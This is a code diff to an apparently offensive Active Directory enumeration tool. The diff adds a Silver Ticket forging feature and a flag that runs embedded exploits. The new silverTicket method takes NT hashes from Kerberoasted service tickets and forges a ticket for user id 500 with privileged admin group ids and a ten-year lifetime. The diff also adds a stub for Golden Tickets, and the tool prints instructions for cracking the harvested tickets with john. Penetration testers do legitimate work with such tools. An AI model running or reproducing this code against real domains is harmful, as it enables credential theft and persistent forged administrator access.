@@ -41,7 +41,7 @@ from bloodhound.ad.authentication import ADAuthentication
 
 class EnumAD():
 
-    def __init__(self, domainController, ldaps, output, enumsmb, bhout, kpre, spnEnum, searchSysvol, dryrun, domuser=None):
+    def __init__(self, domainController, ldaps, output, enumsmb, bhout, kpre, spnEnum, searchSysvol, dryrun, exploits, silvertgt, domuser=None):
         self.server = domainController
         self.domuser = domuser
         self.ldaps = ldaps
@@ -51,6 +51,7 @@ class EnumAD():
         self.spnEnum = spnEnum
         self.enumsmb = enumsmb
         self.searchSysvol = searchSysvol
+        self.silvertgt = silvertgt
 
         self.ou_structure = domainController.split('.')
         self.dc_string=''
@@ -96,7 +97,8 @@ class EnumAD():
         self.checkForPW()
         self.checkOS()
         self.write_file()
-        self.testExploits()
+        if exploits:
+            self.testExploits()
 
         # Unbind the connection to release the handle
         self.conn.unbind()
@@ -108,9 +110,7 @@ class EnumAD():
             self.passwd = str(getpass())
         self.bind()
         self.search()
-       
-        self.checkForPW()
-        self.checkOS()
+               
         if self.searchSysvol:
             self.checkSYSVOL()
 
@@ -122,9 +122,7 @@ class EnumAD():
     
         if self.spnEnum:
             self.enumSPNUsers()
-        
-        self.conn.unbind()
-        
+                
         if self.enumsmb:
             # Setting variables for further testing and analysis
             self.smbShareCandidates = []
@@ -193,7 +191,6 @@ class EnumAD():
             else:
                 self.conn = self.connectors.ldap_connector(self.server, False, self.domuser, self.passwd)
                 print('\033[1A\r[ ' + colored('OK', 'green') +' ] Bound to LDAP server: {0}'.format(self.server))
-        # TODO: Catch individual exceptions instead
         except (LDAPBindError, LDAPSocketOpenError):
             if self.ldaps:
                 print('\033[1A\r[ ' + colored('ERROR', 'red') +' ] Failed to bind to LDAPS server: {0}'.format(self.server))
@@ -568,6 +565,8 @@ class EnumAD():
         if len(user_tickets.keys()) > 0:
             with open('{0}-spn-tickets'.format(self.server), 'w') as f:
                 for key, value in user_tickets.items():
+                    if self.silvertgt:
+                        self.silverTicket(value.split('$')[-2])
                     f.write('{0}:{1}\n'.format(key, value))
             if len(user_tickets.keys()) == 1:
                 print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
@@ -576,6 +575,19 @@ class EnumAD():
         else:
             print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
 
+
+    def goldenTicket(self):
+        from .attacks.ticketer import ticketer
+                
+
+    def silverTicket(self, nthash):
+        from .attacks.ticketer import ticketer
+        opts = argparse.Namespace(debug=False, aesKey=None, nthash=nthash, keytab=None, request=False, hashes=None, spn=None, domain_sid=str(self.domains[0]["objectSid"]), user_id=500, groups="513, 512, 520, 518, 519", duration=3650, extra_sid=None, dc_ip=socket.gethostbyname(self.server))
+        tickets = ticketer.TICKETER('ade', '', self.domuser.split('@')[1], opts)
+        result = tickets.run()
+        if result:
+            print('[ ' + colored('WARN', 'yellow') + ' ] Created Silver Ticket for user "ade" and wrote to ade.ccache')
+        
 
     def enumForCreds(self, ldapdump):
         searchTerms = [
@@ -705,6 +717,8 @@ def main(args):
     parser.add_argument('--all', help='Run all checks', action='store_true')
     parser.add_argument('--no-creds', help='Start without credentials', action='store_true')
     parser.add_argument('--dry-run', help='Don\'t execute a test but run as if. Used for testing params etc.', action='store_true')
+    parser.add_argument('--silvertgt', help='Attempts to get a Silver Ticket. Requires -spn', action='store_true')
+    parser.add_argument('--exploits', help='Run imbedded exploits', action='store_true')
     parser.add_argument('--exploit', type=str, help='Show path to PoC exploit code')
     parser.add_argument('--version', help='Print currently installed version', action='store_true')
 
@@ -736,6 +750,10 @@ def main(args):
         print("--dc argument is required")
         sys.exit(0)
 
+    if args.silvertgt and not args.spn:
+        print('--silvertgt requires -spn to run')
+        sys.exit(0)
+
     # If theres more than 4 sub'ed (test.test.domain.local) - tough luck sunny boy
     domainRE = re.compile(r'^((?:[a-zA-Z0-9-.]+)?(?:[a-zA-Z0-9-.]+)?[a-zA-Z0-9-]+\.[a-zA-Z]+)$')
     userRE = re.compile(r'^([a-zA-Z0-9-\.]+@(?:[a-zA-Z0-9-.]+)?(?:[a-zA-Z0-9-.]+)?[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+)$')
@@ -765,7 +783,7 @@ def main(args):
     if args.out_file:
         file_to_write = args.out_file
 
-    enumAD = EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.sysvol, args.dry_run, args.user)
+    enumAD = EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.sysvol, args.dry_run, args.exploits, args.silvertgt, args.user)
 
     # Just print a blank line for output sake
     print('')
